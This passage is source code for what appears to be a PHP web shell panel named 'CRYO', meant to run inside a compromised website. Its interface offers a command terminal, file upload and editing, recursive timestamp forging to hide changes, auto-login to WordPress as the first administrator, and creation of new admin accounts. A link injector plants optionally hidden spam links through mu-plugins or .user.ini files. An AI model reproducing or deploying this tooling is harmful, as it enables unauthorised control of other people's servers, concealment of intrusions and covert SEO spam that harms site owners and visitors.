                    <button type="submit" name="upload" class="btn btn-primary w-100" <?= !($isAdmin || $isTeman) ? 'disabled' : '' ?>><i class="fas fa-upload"></i> Upload</button>
                </form>
            </div>

            <div class="card">
                <h3><i class="fas fa-cloud-arrow-down"></i> Download from URL</h3>
                <form method="post">
                    <input type="url" name="fileUrl" placeholder="https://example.com/file.zip" required>
                    <input type="text" name="fileUrlName" placeholder="Custom filename (optional)">
                    <button type="submit" name="downloadFromUrl" class="btn btn-primary w-100" <?= !($isAdmin || $isTeman) ? 'disabled' : '' ?>><i class="fas fa-download"></i> Download</button>
                </form>
            </div>

            <div class="card">
                <h3><i class="fas fa-shield-halved"></i> Security Scan</h3>
                <button type="button" class="btn btn-warning w-100" onclick="showScanModal()"><i class="fas fa-radar"></i> Run Scan</button>
                <?php if (!empty($_SESSION['scan_result_file']) && file_exists($_SESSION['scan_result_file'])): ?>
                    <a href="?downloadScan=1" class="btn btn-success w-100 mt-2"><i class="fas fa-download"></i> Download Report</a>
                <?php endif; ?>
            </div>



            <?php if ($isAdmin): ?>
            <div class="card">
                <h3><i class="fas fa-rocket"></i> Deploy File</h3>
                <button type="button" class="btn w-100" onclick="showDeployModal()" style="background:rgba(99,102,241,0.15);color:#a5b4fc;border-color:rgba(99,102,241,0.3)"><i class="fas fa-cloud-arrow-up"></i> Deploy to Domains</button>
            </div>
            <?php endif; ?>

            <?php if ($isAdmin): ?>
            <div class="card">
                <h3><i class="fas fa-shield-halved"></i> Htaccess & Redirect <?php if (!empty($cryoActiveCount)): ?><span style="background:#f59e0b;color:#000;font-size:10px;padding:2px 7px;border-radius:10px;margin-left:6px;font-weight:700"><?= $cryoActiveCount ?> aktif</span><?php endif; ?></h3>
                <button type="button" class="btn btn-warning w-100" onclick="showRedirectModal()"><i class="fas fa-cogs"></i> Htaccess & Redirect<?php if (!empty($cryoActiveCount)): ?> <span style="background:rgba(0,0,0,0.3);padding:1px 7px;border-radius:10px;font-size:11px;margin-left:4px"><?= $cryoActiveCount ?></span><?php endif; ?></button>

            <?php if ($isAdmin): ?>
            <div class="card">
                <h3><i class="fas fa-link" style="color:#22d3ee"></i> Sisip Link</h3>
                <button type="button" class="btn w-100" onclick="showLinkInjectModal()" style="background:rgba(34,211,238,0.15);color:#67e8f9;border-color:rgba(34,211,238,0.3)"><i class="fas fa-link"></i> Kelola Sisip Link</button>
            </div>
            <?php endif; ?>
            </div>
            <?php endif; ?>

            <div class="card">
                <h3><i class="fas fa-clock-rotate-left"></i> Sync Timestamp</h3>
                <form method="post">
                    <input type="text" name="ts_target" placeholder="Target path" required>
                    <div class="flex gap-2">
                        <input type="date" name="ts_date" required style="flex:1">
                        <input type="time" name="ts_time" required style="flex:1">
                    </div>
                    <label style="display:flex;align-items:center;gap:6px;font-size:11px;margin:4px 0 8px"><input type="checkbox" name="ts_recursive" value="1" checked> Recursive</label>
                    <button type="submit" name="doSyncTimestamp" class="btn btn-primary w-100" <?= !($isAdmin || $isTeman) ? 'disabled' : '' ?>><i class="fas fa-sync"></i> Sync</button>
                </form>
            </div>

            <?php if ($isAdmin): ?>
            <div class="card">
                <h3><i class="fab fa-wordpress"></i> WordPress Admin</h3>
                <button type="button" class="btn btn-primary w-100" onclick="showAdminModal()"><i class="fas fa-user-gear"></i> Admin Tools</button>
            </div>
            <?php endif; ?>

            <?php if ($isAdmin): ?>
            <div class="card">
                <h3><i class="fas fa-terminal"></i> Terminal</h3>
                <button type="button" class="btn btn-success w-100" onclick="showTerminalModal()"><i class="fas fa-terminal"></i> Open Terminal</button>
            </div>
              <?php endif; ?>

              <div class="card">
                  <h3><i class="fas fa-magnifying-glass"></i> Code Explorer</h3>
                  <button type="button" class="btn w-100" onclick="showCryoSearchModal()" style="background:rgba(34,197,94,0.15);color:#86efac;border-color:rgba(34,197,94,0.3)"><i class="fas fa-magnifying-glass-arrows-rotate"></i> Search Files & Code</button>
              </div>

              <div class="card">
                  <h3><i class="fas fa-trash-can"></i> Trash</h3>
                  <?php $trashCount = count(getTrashItems()); ?>
                  <a href="?view_trash=1&folder=<?= urlencode($directory) ?>" class="btn w-100" style="background:rgba(239,68,68,0.15);color:#fca5a5;border-color:rgba(239,68,68,0.3)">
                      <i class="fas fa-trash-can"></i> Open Trash (<?= $trashCount ?>)
                  </a>
              </div>
          </div>

          <div class="main-content">
            <div class="breadcrumb">
                <?php if (count($_SESSION['dir_history']) > 1): ?>
                    <a href="?back_dir=1"><i class="fas fa-arrow-left"></i> Back</a>
                <?php else: ?>
                    <span class="text-muted"><i class="fas fa-arrow-left"></i> Back</span>
                <?php endif; ?>
                <span class="separator">/</span>
                <a href="?folder=<?= urlencode($rootDirectory) ?>"><i class="fas fa-home"></i> Home</a>
                <span class="separator">/</span>
                <a href="?folder=<?= urlencode($rootPath) ?>"><i class="fas fa-server"></i> Root</a>
                <span class="separator">/</span>
                <span class="current"><i class="fas fa-folder-open"></i> <?= htmlspecialchars($directory) ?></span>
            </div>

            <?php if (isset($_GET['view_trash'])): ?>
              <div class="card" style="margin-bottom:16px">
                  <div style="display:flex;align-items:center;justify-content:space-between;margin-bottom:12px">
                      <h3 style="margin:0"><i class="fas fa-trash-can" style="color:#ef4444"></i> Trash Bin</h3>
                      <div style="display:flex;gap:8px;align-items:center">
                          <a href="?folder=<?= urlencode($directory) ?>" class="btn btn-sm"><i class="fas fa-arrow-left"></i> Back</a>
                          <?php if (count(getTrashItems()) > 0): ?>
                          <form method="post" style="display:inline" onsubmit="return confirm('Hapus semua item di Trash secara PERMANEN?')">
                              <button type="submit" name="emptyTrash" class="btn btn-sm btn-danger"><i class="fas fa-dumpster-fire"></i> Empty Trash</button>
                          </form>
                          <?php endif; ?>
                      </div>
                  </div>
                  <?php
                  $trashItems = getTrashItems();
                  if (empty($trashItems)):
                  ?>
                      <div style="text-align:center;padding:40px 20px;color:var(--muted)">
                          <i class="fas fa-trash-can" style="font-size:48px;margin-bottom:12px;opacity:0.3;display:block"></i>
                          <p>Trash kosong</p>
                      </div>
                  <?php else: ?>
                      <div style="font-size:11px;color:var(--muted);margin-bottom:8px">
                          <?= count($trashItems) ?> item &bull; Auto-delete setelah 7 hari
                      </div>
                      <?php foreach ($trashItems as $tItem): ?>
                      <div class="file-row" style="display:flex;align-items:center;gap:10px;padding:8px 12px;margin-bottom:4px;background:var(--bg2);border-radius:8px;border:1px solid var(--border)">
                          <span><?= $tItem['type'] === 'dir' ? '<i class="fas fa-folder" style="color:#f59e0b"></i>' : getFileIcon($tItem['original_name']) ?></span>
                          <div style="flex:1;min-width:0">
                              <div style="font-weight:500;white-space:nowrap;overflow:hidden;text-overflow:ellipsis"><?= htmlspecialchars($tItem['original_name']) ?></div>
                              <div style="font-size:10px;color:var(--muted)">
                                  <?= htmlspecialchars($tItem['deleted_at']) ?> &bull;
                                  <?= htmlspecialchars(str_replace($_SERVER['DOCUMENT_ROOT'], '~', $tItem['original_path'])) ?>
                                  <?php if ($tItem['size'] > 0): ?> &bull; <?= getNiceSize($tItem['size']) ?><?php endif; ?>
                              </div>
                          </div>
                          <div style="display:flex;gap:4px">
                              <form method="post" style="display:inline">
                                  <input type="hidden" name="trash_item" value="<?= htmlspecialchars($tItem['trash_name']) ?>">
                                  <button type="submit" name="restoreTrash" class="btn btn-sm" style="background:rgba(34,197,94,0.15);color:#86efac;border-color:rgba(34,197,94,0.3)" title="Restore">
                                      <i class="fas fa-rotate-left"></i>
                                  </button>
                              </form>
                              <form method="post" style="display:inline" onsubmit="return confirm('Hapus permanen?')">
                                  <input type="hidden" name="trash_item" value="<?= htmlspecialchars($tItem['trash_name']) ?>">
                                  <button type="submit" name="purgeTrash" class="btn btn-sm btn-danger" title="Hapus Permanen">
                                      <i class="fas fa-xmark"></i>
                                  </button>
                              </form>
                          </div>
                      </div>
                      <?php endforeach; ?>
                  <?php endif; ?>
              </div>
              <?php else: ?>

              <div class="breadcrumb" style="padding:8px 16px;font-size:11px">
                <?php
                $relativePath = substr($directory, strlen($rootPath));
                $relativePath = ltrim($relativePath, DIRECTORY_SEPARATOR);
                if ($relativePath !== '') {
                    $parts = explode(DIRECTORY_SEPARATOR, $relativePath);
                    $cumulative = $rootPath;
                    foreach ($parts as $index => $part) {
                        $cumulative = rtrim($cumulative, DIRECTORY_SEPARATOR) . DIRECTORY_SEPARATOR . $part;
                        $isLast = ($index === count($parts) - 1);
                        ?>
                        <span class="separator">/</span>
                        <?php if ($isLast): ?>
                            <span class="current"><?= htmlspecialchars($part) ?></span>
                        <?php else: ?>
                            <a href="?folder=<?= urlencode($cumulative) ?>"><?= htmlspecialchars($part) ?></a>
                        <?php endif;
                    }
                } else {
                    echo '<span class="separator">/</span>';
                    echo '<span class="current">/</span>';
                }
                ?>
            </div>

            <?php if (isset($_SESSION['error'])): ?>
                <div class="alert error"><i class="fas fa-circle-exclamation"></i> <?= $_SESSION['error']; unset($_SESSION['error']); ?></div>
            <?php endif; ?>
            <?php if (isset($_SESSION['success'])): ?>
                <div class="alert success"><i class="fas fa-circle-check"></i> <?= $_SESSION['success']; unset($_SESSION['success']); ?></div>
            <?php endif; ?>

            <form id="multiActionForm" method="post" class="flex gap-2 mb-3" style="flex-wrap:wrap;align-items:center">
                <button type="button" class="btn btn-sm" onclick="selectAll(true)"><i class="fas fa-check-double"></i> All</button>
                <button type="button" class="btn btn-sm" onclick="selectAll(false)"><i class="fas fa-xmark"></i> None</button>
                <button type="submit" name="deleteSelected" class="btn btn-sm btn-danger" onclick="return confirm('Delete selected?')" <?= !($isAdmin || $isTeman) ? 'disabled' : '' ?>><i class="fas fa-trash"></i> Delete</button>
                <input type="text" name="chmodSelectedValue" placeholder="755" style="width:65px;margin:0" pattern="[0-7]{3,4}">
                <button type="submit" name="chmodSelected" class="btn btn-sm" <?= !($isAdmin || $isTeman) ? 'disabled' : '' ?>><i class="fas fa-lock"></i></button>
                <select name="archive_format" style="width:90px;margin:0">
                    <option value="zip">ZIP</option>
                    <option value="tar">TAR</option>
                    <option value="tar.gz">TAR.GZ</option>
                    <option value="tar.bz2">TAR.BZ2</option>
                </select>
                <button type="submit" name="zipSelected" class="btn btn-sm btn-success" <?= !($isAdmin || $isTeman) ? 'disabled' : '' ?>><i class="fas fa-file-zipper"></i> Archive</button>
                <span class="text-muted" style="font-size:11px;margin-left:auto"><?= $totalItems ?> items | Page <?= $page ?>/<?= $totalPages ?></span>
            </form>

            <div class="file-header">
                <div style="width:28px"></div>
                <div style="width:28px"></div>
                <div style="flex:1">Name</div>
                <div style="min-width:60px;text-align:right">Size</div>
                <div style="min-width:60px;text-align:right">Perm</div>
                <div style="min-width:80px;text-align:right">Modified</div>
                <div style="min-width:140px;text-align:right">Actions</div>
            </div>

            <div class="file-list">
                <?php
                $no = 0;
                foreach ($filesAndFolders as $item):
                    $no++;
                    $fullpath = $directory . '/' . $item;
                    $colorClass = getPermissionColor($fullpath);
                    $perms = (is_readable($fullpath) && @fileperms($fullpath)) ? substr(sprintf('%o', fileperms($fullpath)), -4) : '----';
                    $timestamp = @filemtime($fullpath);
                    $dateModified = $timestamp ? date('Y-m-d H:i', $timestamp) : '-';
                    $sizeDisplay = is_file($fullpath) ? getNiceSize(@filesize($fullpath)) : (is_dir($fullpath) ? '-' : '-');
                    $isHtaccess = (basename($fullpath) === '.htaccess');
                ?>
                <div class="file-item <?= $colorClass ?>">
                    <div class="file-checkbox">
                        <input type="checkbox" class="select-item" name="selectedItems[]" value="<?= htmlspecialchars($item) ?>" form="multiActionForm">
                    </div>
                    <div class="file-icon">
                        <?php if (is_dir($fullpath)): ?>
                            <i class="fas fa-folder" style="color:#818cf8"></i>
                        <?php else: ?>
                            <?= getFileIcon($item) ?>
                        <?php endif; ?>
                    </div>
                    <div class="file-name">
                        <?php if (is_dir($fullpath)): ?>
                            <a href="?folder=<?= urlencode($fullpath) ?>" title="<?= htmlspecialchars($item) ?>"><?= htmlspecialchars($item) ?></a>
                        <?php else: ?>
                            <form method="post" style="display:inline">
                                <input type="hidden" name="fileNameToEdit" value="<?= htmlspecialchars($item) ?>">
                                <button type="submit" name="edit" style="background:none;border:none;color:var(--text);cursor:pointer;font-family:inherit;font-size:13px;font-weight:500;padding:0" title="Edit"><?= htmlspecialchars($item) ?></button>
                            </form>
                        <?php endif; ?>
                    </div>
                    <div class="file-size"><?= $sizeDisplay ?></div>
                    <div class="file-perm"><?= $perms ?></div>
                    <div class="file-date"><?= $dateModified ?></div>
                    <div class="file-actions">
                        <a href="<?= htmlspecialchars(getDirectLink($fullpath)) ?>" target="_blank" class="btn btn-sm" title="Direct link"><i class="fas fa-link"></i></a>
                        <a href="?download=<?= urlencode($fullpath) ?>" class="btn btn-sm" title="Download"><i class="fas fa-download"></i></a>

                        <?php if (is_file($fullpath) && is_readable($fullpath) && ($isAdmin || ($isTeman && !$isHtaccess))): ?>
                            <a href="?view=<?= urlencode($fullpath) ?>" class="btn btn-sm" title="View"><i class="fas fa-eye"></i></a>
                        <?php endif; ?>

                        <?php if ($isAdmin || ($isTeman && !$isHtaccess)): ?>
                        <form method="post" style="display:inline">
                            <input type="hidden" name="oldName" value="<?= htmlspecialchars($item) ?>">
                            <input type="text" name="newName" placeholder="new name" style="width:70px;display:none;margin:0" class="rename-input">
                            <button type="button" class="btn btn-sm rename-btn" onclick="this.style.display='none';this.parentNode.querySelector('.rename-input').style.display='inline';this.parentNode.querySelector('button[name=rename]').style.display='inline'"><i class="fas fa-pen"></i></button>
                            <button type="submit" name="rename" style="display:none" class="btn btn-sm btn-success"><i class="fas fa-check"></i></button>
                        </form>
                        <?php endif; ?>

                        <?php if ($isAdmin): ?>
                        <form method="post" style="display:inline">
                            <input type="hidden" name="nameToChmod" value="<?= htmlspecialchars($item) ?>">
                            <input type="text" name="perm" placeholder="755" style="width:38px;margin:0">
                            <button type="submit" name="chmod" class="btn btn-sm"><i class="fas fa-lock"></i></button>
                        </form>
                        <?php endif; ?>

                        <?php if ($isAdmin || ($isTeman && !$isHtaccess)): ?>
                        <form class="ajax-delete-form" data-name="<?= htmlspecialchars($item) ?>" style="display:inline">
                            <input type="hidden" name="target" value="<?= htmlspecialchars($item) ?>">
                            <button type="button" class="btn btn-sm btn-danger delete-btn"><i class="fas fa-trash"></i></button>
                        </form>
                        <?php endif; ?>

                        <?php if ($isAdmin): ?>
                        <form method="post" style="display:inline">
                            <input type="hidden" name="itemToZip" value="<?= htmlspecialchars($item) ?>">
                            <button type="submit" name="zip" class="btn btn-sm" title="Zip"><i class="fas fa-file-zipper"></i></button>
                        </form>
                        <?php endif; ?>

                        <?php
                        $ext = strtolower(pathinfo($item, PATHINFO_EXTENSION));
                        $isArchive = in_array($ext, ['zip', 'tar', 'gz', 'bz2', 'rar']) || substr($item, -7) == '.tar.gz' || substr($item, -8) == '.tar.bz2';
                        if ($isArchive && ($isAdmin || $isTeman)):
                        ?>
                        <button type="button" class="btn btn-sm extract-btn" data-archive="<?= htmlspecialchars($item) ?>"><i class="fas fa-file-export"></i></button>
                        <?php endif; ?>
                    </div>
                </div>
                <?php endforeach; ?>
            </div>

            <?php if ($totalPages > 1): ?>
                <div class="pagination">
                    <?php for ($i = 1; $i <= $totalPages; $i++): ?>
                        <?php if ($i == $page): ?>
                            <span class="page-link disabled"><?= $i ?></span>
                        <?php else: ?>
                            <a class="page-link" href="?folder=<?= urlencode($directory) ?>&page=<?= $i ?>"><?= $i ?></a>
                        <?php endif; ?>
                    <?php endfor; ?>
                </div>
            <?php endif; ?>
            <?php endif; ?>
        </div>
    </div>

    <?php if ($isAdmin): ?>
    <div id="terminalModal" class="modal" style="align-items:flex-end;padding-bottom:0">
        <div class="modal-content" style="max-width:960px;width:100%;border-radius:16px 16px 0 0;padding:0;overflow:hidden;height:500px;display:flex;flex-direction:column">
            <div class="modal-header" style="background:rgba(10,14,26,0.95);padding:10px 16px;border-bottom:1px solid var(--border);border-radius:0;flex-shrink:0;margin:0">
                <div style="display:flex;align-items:center;gap:8px">
                    <i class="fas fa-terminal" style="color:var(--accent-h)"></i>
                    <span style="font-weight:600;font-size:13px">CRYO Terminal</span>
                    <span id="term-cwd-label" style="font-size:11px;color:var(--muted);margin-left:8px"></span>
                </div>
                <div style="display:flex;gap:6px;align-items:center">
                    <button class="btn btn-sm" onclick="termClear()" style="font-size:10px"><i class="fas fa-eraser"></i></button>
                    <button class="modal-close" onclick="closeTerminalModal()">&times;</button>
                </div>
            </div>
            <div id="term-output" style="flex:1;overflow-y:auto;background:rgba(10,14,26,0.98);padding:12px 16px;font-family:'JetBrains Mono',monospace;font-size:12px;color:#c9d1d9;white-space:pre-wrap;word-break:break-all"></div>
            <div style="display:flex;align-items:center;background:rgba(15,23,42,0.95);border-top:1px solid var(--border);padding:8px 16px;gap:8px;flex-shrink:0">
                <span id="term-prompt" style="color:var(--accent-h);font-family:'JetBrains Mono',monospace;font-size:12px;white-space:nowrap">$</span>
                <input id="term-input" type="text" placeholder="Type command..." autocomplete="off" autocorrect="off" autocapitalize="off" spellcheck="false" style="flex:1;background:transparent;border:none;outline:none;color:#c9d1d9;font-family:'JetBrains Mono',monospace;font-size:12px;margin:0;padding:0;box-shadow:none">
                <button class="btn btn-sm btn-primary" onclick="termExec()">Run</button>
            </div>
        </div>
    </div>
    <?php endif; ?>

    <div id="cryoSearchModal" class="modal">
          <div class="modal-content" style="max-width:900px;width:95%">
              <div class="modal-header">
                  <h3><i class="fas fa-magnifying-glass" style="color:#22c55e"></i> Code Explorer  Pencarian Dinamis</h3>
                  <button class="modal-close" onclick="closeCryoSearchModal()">&times;</button>
              </div>
              <div>
                  <div style="display:grid;grid-template-columns:1fr;gap:8px">
                      <div>
                          <label style="font-size:12px;color:var(--muted)">Query (kata, nama variabel, atau regex)</label>
                          <input type="text" id="cryoSearchQuery" placeholder="contoh: wp-config / function login / preg_match" autofocus>
                      </div>
                      <div>
                          <label style="font-size:12px;color:var(--muted)">Scope Path (folder awal pencarian, absolut)</label>
                          <input type="text" id="cryoSearchScope" value="<?= htmlspecialchars($directory) ?>" placeholder="/home3/.../public_html">
                          <div style="display:flex;gap:6px;margin-top:6px;flex-wrap:wrap">
                              <button type="button" class="btn" style="font-size:11px;padding:4px 8px" onclick="cryoSetScope('current')">Folder ini</button>
                              <button type="button" class="btn" style="font-size:11px;padding:4px 8px" onclick="cryoSetScope('docroot')">Document Root</button>
                              <button type="button" class="btn" style="font-size:11px;padding:4px 8px" onclick="cryoSetScope('parent')">.. (Parent)</button>
                          </div>
                      </div>
                      <div style="display:grid;grid-template-columns:1fr 1fr;gap:8px">
                          <div>
                              <label style="font-size:12px;color:var(--muted)">Mode</label>
                              <select id="cryoSearchMode">
                                  <option value="both">Nama File + Isi (default)</option>
                                  <option value="filename">Nama File saja</option>
                                  <option value="content">Isi File saja</option>
                              </select>
                          </div>
                          <div>
                              <label style="font-size:12px;color:var(--muted)">Filter Nama File (glob, opsional)</label>
                              <input type="text" id="cryoSearchPattern" placeholder="contoh: *.php,*.html (kosong = semua)">
                          </div>
                      </div>
                      <div style="display:flex;gap:14px;flex-wrap:wrap;font-size:12px">
                          <label style="display:flex;align-items:center;gap:6px;cursor:pointer"><input type="checkbox" id="cryoSearchCase"> Case-sensitive</label>
                          <label style="display:flex;align-items:center;gap:6px;cursor:pointer"><input type="checkbox" id="cryoSearchRegex"> Regex</label>
                          <label style="display:flex;align-items:center;gap:6px">Max hasil: <input type="number" id="cryoSearchMax" value="500" min="1" max="2000" style="width:80px;padding:2px 6px;font-size:12px"></label>
                      </div>
                  </div>
  
                  <div style="display:flex;gap:8px;margin:12px 0">
                      <button class="btn btn-primary" onclick="cryoRunSearch()"><i class="fas fa-magnifying-glass"></i> Cari</button>
                      <button class="btn" onclick="cryoClearResults()">Clear</button>
                      <span id="cryoSearchStat" style="font-size:12px;color:var(--muted);align-self:center;margin-left:8px"></span>
                  </div>
  
                  <div id="cryoSearchResults" style="max-height:50vh;overflow:auto;border:1px solid var(--border);border-radius:6px;background:rgba(0,0,0,0.2);padding:6px;font-family:ui-monospace,Menlo,Consolas,monospace;font-size:12px">
                      <div style="padding:18px;text-align:center;color:var(--muted)">Belum ada pencarian.</div>
                  </div>
              </div>
          </div>
      </div>
  
      <div id="extractModal" class="modal">
        <div class="modal-content">
            <div class="modal-header">
                <h3><i class="fas fa-file-export" style="color:var(--accent-h)"></i> Extract Archive</h3>
                <button class="modal-close" onclick="closeExtractModal()">&times;</button>
            </div>
            <form method="post">
                <input type="hidden" name="archive_file" id="extract-archive-file">
                <label style="font-size:12px;color:var(--muted);margin-bottom:4px;display:block">Destination directory</label>
                <input type="text" name="extract_dest" id="extract-dest" value="<?= htmlspecialchars($directory) ?>" required>
                <div class="modal-footer">
                    <button type="button" class="btn" onclick="closeExtractModal()">Cancel</button>
                    <button type="submit" name="extractArchive" class="btn btn-primary">Extract</button>
                </div>
            </form>
        </div>
    </div>

    <div id="editModal" class="modal">
        <div class="modal-content" style="max-width:860px;width:92%">
            <div class="modal-header">
                <h3><i class="fas fa-code" style="color:var(--accent-h)"></i> <span id="edit-filename"></span></h3>
                <button class="modal-close" onclick="closeEditModal()">&times;</button>
            </div>
            <div style="border:1px solid var(--border);border-radius:10px;overflow:hidden">
                <textarea id="edit-content" style="display:none"></textarea>
                <div id="editor-container"></div>
            </div>
            <div class="modal-footer">
                <button class="btn" onclick="closeEditModal()">Cancel</button>
                <button class="btn btn-primary" onclick="saveEdit()"><i class="fas fa-floppy-disk"></i> Save</button>
            </div>
        </div>
    </div>

    <div id="adminModal" class="modal">
        <div class="modal-content">
            <div class="modal-header">
                <h3><i class="fab fa-wordpress" style="color:var(--accent-h)"></i> WordPress Admin Tools</h3>
                <button class="modal-close" onclick="closeAdminModal()">&times;</button>
            </div>
            <div>
                <h4 style="font-size:13px;margin-bottom:8px">Auto-login as first admin</h4>
                <input type="password" id="admin-pin" placeholder="PIN">
                <button class="btn btn-primary" onclick="adminLogin()">Login</button>
                <hr style="margin:16px 0;border-color:var(--border)">
                <h4 style="font-size:13px;margin-bottom:8px">Create new admin user</h4>
                <input type="text" id="admin-new-user" placeholder="Username">
                <input type="password" id="admin-new-pass" placeholder="Password">
                <input type="email" id="admin-new-email" placeholder="Email (optional)">
                <button class="btn btn-success" onclick="adminCreateUser()">Create</button>
            </div>
        </div>
    </div>

      <!-- CRYO Sisip Link Modal -->
      <div id="linkInjectModal" class="modal">
          <div class="modal-content" style="max-width:640px;max-height:90vh;overflow-y:auto">
              <div class="modal-header">
                  <h3><i class="fas fa-link" style="color:#22d3ee"></i> Sisip Link  Link Injector</h3>
                  <button class="modal-close" onclick="closeLinkInjectModal()">&times;</button>
              </div>
              <div>
                  <div id="linkInjectStatus" style="padding:8px 10px;border-radius:6px;background:rgba(99,102,241,0.1);font-size:12px;margin-bottom:10px;color:var(--muted)">Memuat status...</div>

                  <label style="font-size:12px;color:var(--muted)">Scope (folder target, otomatis pakai folder aktif)</label>
                  <input type="text" id="linkInjectScope" value="<?= htmlspecialchars($directory, ENT_QUOTES) ?>" readonly style="background:rgba(255,255,255,0.04)">

                  <div style="margin-top:10px;padding:8px;border:1px dashed var(--border);border-radius:6px">
                      <div style="font-size:11px;color:#fbbf24;margin-bottom:6px"><i class="fas fa-circle-info"></i> Link 1 wajib  Link 2 & 3 opsional. Kosongkan untuk skip.</div>
                  </div>

                    <div style="margin-top:10px">
                        <label style="font-size:12px;color:var(--muted)">Framework target</label>
                        <select id="linkInjectFramework" style="width:100%">
                            <option value="auto" selected>Auto-detect (default)</option>
                            <option value="wp">WordPress (mu-plugin)</option>
                            <option value="laravel">Laravel (.user.ini di /public)</option>
                            <option value="other">Lainnya / PHP biasa (.user.ini)</option>
                        </select>
                        <div style="font-size:11px;color:var(--muted);margin-top:4px">Auto = deteksi WordPress / Laravel / CodeIgniter / Yii / Slim, fallback .user.ini.</div>
                    </div>
  
                  <?php for ($li = 1; $li <= 3; $li++): ?>
                  <div style="margin-top:12px;padding:10px;border:1px solid var(--border);border-radius:6px">
                      <div style="font-size:12px;font-weight:600;color:#a5b4fc;margin-bottom:6px">Link <?= $li ?> <?= $li === 1 ? '<span style="color:#fbbf24">(wajib)</span>' : '<span style="color:var(--muted);font-weight:400">(opsional)</span>' ?></div>
                      <input type="url" id="link<?= $li ?>_url" placeholder="URL (https://...)">
                      <input type="text" id="link<?= $li ?>_anchor" placeholder="Anchor text" style="margin-top:6px">
                      <div style="display:flex;gap:8px;align-items:center;margin-top:6px">
                          <select id="link<?= $li ?>_rel" style="flex:1">
                              <option value="dofollow">dofollow</option>
                              <option value="nofollow">nofollow</option>
                              <option value="ugc">ugc</option>
                              <option value="sponsored">sponsored</option>
                          </select>
                          <label style="display:flex;align-items:center;gap:5px;font-size:11px;color:var(--muted);white-space:nowrap"><input type="checkbox" id="link<?= $li ?>_hidden"> Hidden (display:none)</label>
                      </div>
                  </div>
                  <?php endfor; ?>

                  <div style="display:flex;gap:8px;margin-top:14px">
                      <button class="btn btn-success" onclick="cryoLinkInjectOn()" style="flex:1"><i class="fas fa-power-off"></i> Aktifkan / Update</button>
                      <button class="btn btn-danger" onclick="cryoLinkInjectOff()" style="flex:1"><i class="fas fa-trash"></i> Nonaktifkan & Bersihkan</button>
                  </div>

                  <div id="linkInjectResult" style="margin-top:10px;font-size:12px"></div>
              </div>
          </div>
      </div>

      <script>
        function showLinkInjectModal(){
            document.getElementById('linkInjectModal').style.display = 'flex';
            cryoLinkInjectStatus();
        }
        function closeLinkInjectModal(){ document.getElementById('linkInjectModal').style.display = 'none'; }
        function _liEsc(s){ return String(s).replace(/[&<>"']/g, function(c){ return ({'&':'&amp;','<':'&lt;','>':'&gt;','"':'&quot;',"'":'&#39;'})[c]; }); }
        function cryoLinkInjectStatus(){
            var sb = document.getElementById('linkInjectStatus');
            var scope = document.getElementById('linkInjectScope').value;
            sb.innerHTML = '<i class="fas fa-spinner fa-spin"></i> Memuat status...';
            var fd = new FormData();
            fd.append('cryo_link_inject_status','1');
            fd.append('scope', scope);
            fetch(window.location.href, { method:'POST', body:fd, credentials:'same-origin' })
              .then(function(r){ return r.json(); })
              .then(function(j){
                if (!j.success){ sb.innerHTML = '<span style="color:#fca5a5">Error: '+_liEsc(j.error||'')+'</span>'; return; }
                var col = j.active ? '#22c55e' : '#94a3b8';
                var label = j.active ? 'AKTIF ('+(j.links?j.links.length:0)+' link)' : 'NONAKTIF';
                sb.innerHTML = '<strong style="color:'+col+'"><i class="fas fa-circle"></i> Status: '+label+'</strong>'
                  + ' � Framework terdeteksi: <strong>'+_liEsc((j.files && j.files.detected) ? j.files.detected : (j.is_wp?'wp':'default'))+'</strong>'
                  + '<br><span style="font-size:11px;color:var(--muted)">.site_links.json: '+(j.files.links_json?'':'')+' � .panel_render.php: '+(j.files.render?'':'')+' � mu-plugin: '+(j.files.mu_plugin?'':'')+' � .user.ini: '+(j.files.user_ini_ref?'':'')+' � entry-injected: '+(j.files.entry_injected?'':'')+'</span>';
                // Pre-fill form with existing
                if (j.links && j.links.length){
                    for (var i=0; i<3; i++){
                        var L = j.links[i] || {};
                        var u = document.getElementById('link'+(i+1)+'_url');
                        var a = document.getElementById('link'+(i+1)+'_anchor');
                        var r = document.getElementById('link'+(i+1)+'_rel');
                        var h = document.getElementById('link'+(i+1)+'_hidden');
                        if (u) u.value = L.url || '';
                        if (a) a.value = L.anchor || '';
                        if (r) r.value = L.rel || 'dofollow';
                        if (h) h.checked = !!L.hidden;
                    }
                }
              })
              .catch(function(e){ sb.innerHTML = '<span style="color:#fca5a5">Network error: '+_liEsc(e.message)+'</span>'; });
        }
        function cryoLinkInjectOn(){
            var rb = document.getElementById('linkInjectResult');
            rb.innerHTML = '<i class="fas fa-spinner fa-spin"></i> Menulis file...';
            var fd = new FormData();
            fd.append('cryo_link_inject_on','1');
            fd.append('scope', document.getElementById('linkInjectScope').value);
            fd.append('framework', (document.getElementById('linkInjectFramework')||{}).value || 'auto');
            for (var i=1; i<=3; i++){
                fd.append('link'+i+'_url',    document.getElementById('link'+i+'_url').value);
                fd.append('link'+i+'_anchor', document.getElementById('link'+i+'_anchor').value);
                fd.append('link'+i+'_rel',    document.getElementById('link'+i+'_rel').value);
                if (document.getElementById('link'+i+'_hidden').checked) fd.append('link'+i+'_hidden','1');
            }
            fetch(window.location.href, { method:'POST', body:fd, credentials:'same-origin' })
              .then(function(r){ return r.json(); })
              .then(function(j){
                if (!j.success){ rb.innerHTML = '<div style="padding:8px;color:#fca5a5;background:rgba(239,68,68,0.1);border-radius:6px"> '+_liEsc(j.error||'')+'</div>'; return; }
                var dlHtml = '';
                if (j.report_id && j.report_sig) {
                  var dlUrl = window.location.pathname + '?cryo_report_dl=' + encodeURIComponent(j.report_id) + '&sig=' + encodeURIComponent(j.report_sig);
                  dlHtml = '<div style="margin-top:6px"><a href="'+dlUrl+'" download class="btn btn-sm" style="display:inline-block;padding:6px 10px;background:#3b82f6;color:#fff;border-radius:6px;text-decoration:none;font-size:11px"><i class="fas fa-download"></i> Download Laporan Deploy (TXT)</a> <span style="font-size:10px;color:var(--muted)">(file akan otomatis terhapus setelah didownload)</span></div>';
                }
                rb.innerHTML = '<div style="padding:8px;color:#86efac;background:rgba(34,197,94,0.1);border-radius:6px"> Aktif. '+j.count+' link tersimpan. Framework: <strong>'+_liEsc(j.framework||'default')+'</strong> (deteksi: '+_liEsc(j.detected||'-')+'). Mode: <strong>'+_liEsc(j.mode)+'</strong>'+dlHtml+'</div>';
                cryoLinkInjectStatus();
              })
              .catch(function(e){ rb.innerHTML = '<div style="padding:8px;color:#fca5a5">Network error: '+_liEsc(e.message)+'</div>'; });
        }
        function cryoLinkInjectOff(){
            if (!confirm('Yakin nonaktifkan & hapus semua file injector di scope ini?')) return;
